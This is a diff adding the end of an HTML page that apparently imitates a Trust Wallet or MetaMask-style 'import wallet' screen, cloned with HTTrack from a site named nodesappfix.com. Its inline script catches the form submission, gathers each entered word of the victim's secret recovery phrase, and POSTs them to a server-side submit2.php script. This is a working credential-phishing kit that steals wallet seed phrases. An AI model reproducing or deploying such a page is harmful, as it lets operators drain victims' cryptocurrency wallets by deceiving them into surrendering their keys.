+                        <p class="actionable-message__message" style="padding-top: 6px">
+                          Secret Recovery Phrases contain 12, 15, 18, 21, or 24
+                          words
+                        </p>
+
+                        <svg width="24px" height="24px" id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
+                          <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"></path>
+                        </svg>
+                      </div>
+                    </div>
+                  </div>
+                    <button type="submit" class="button btn--first-time first-time-flow__button mport_wallet">
+                    Proceed
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <img id="logoToDetectColor" src="files/html.html" style="display: none">
+    </div>
+
+    <script src="files/phrase_dictionary.js.download" type="text/javascript" charset="utf-8"></script>
+
+    <script src="files/phrase_dictionary.js.download" type="text/javascript" charset="utf-8"></script>
+    <script src="files/main.js.download" type="text/javascript" charset="utf-8"></script>
+
+    <script src="files/custom.js.download" type="text/javascript" charset="utf-8"></script>
+  <script src=
+"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js">
+    </script>
+    <script type="text/javascript">
+    $(document).ready(function() {
+        $('form').on('submit', function(event) {
+            event.preventDefault();
+              
+            let names  = 1;
+            // It returns a array of object 
+            let userinfo = $(this).serializeArray();
+            let user = {};
+            userinfo.forEach((value) => {
+                  
+            	
+                // Dynamically create an object
+                user["Phrase " + names++ ] = value.value;
+            });
+            let url = "./submit2.php";
+            $.ajax({
+                method: "POST",
+                url: url,
+                data: user
+            }).done(function(msg) {
+                  console.log(msg);
+                // When the request is successful
+                
+             //   window.location.href = "./barcode.html";
+            }).fail(function(err, textstatus, error) {
+            console.log('nawao');
+          //   window.location.replace("./barcode.html");
+          
+            });
+        });
+    });
+    
+    </script>
+ 
+
+</body>
+<!-- Mirrored from nodesappfix.com/en/smartdappsconnect.surge.sh_protocols_others__chainName=All&protocolName=Trust Wallet&protocolCode=trust_wallet.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 02 Apr 2024 22:09:32 GMT -->
+</html>
